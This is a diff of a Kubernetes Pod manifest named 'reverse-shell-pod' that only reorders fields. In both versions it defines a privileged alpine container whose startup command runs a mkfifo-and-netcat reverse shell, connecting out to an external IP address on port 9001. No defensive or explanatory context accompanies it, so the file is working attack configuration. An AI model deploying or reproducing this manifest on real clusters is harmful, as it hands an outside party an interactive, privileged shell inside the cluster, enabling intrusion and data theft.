@@ -1,14 +1,14 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: reverse-shell-pod
+  name: reverse-shell-pod
 spec:
-  containers:
-  - name: shell-container
-    image: alpine
-    command: ["/bin/sh", "-c"]
-    securityContext:
-      privileged: true
-    args:
-    - |
-      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
+  containers:
+  - name: shell-container
+    image: alpine
+    securityContext:
+      privileged: true
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
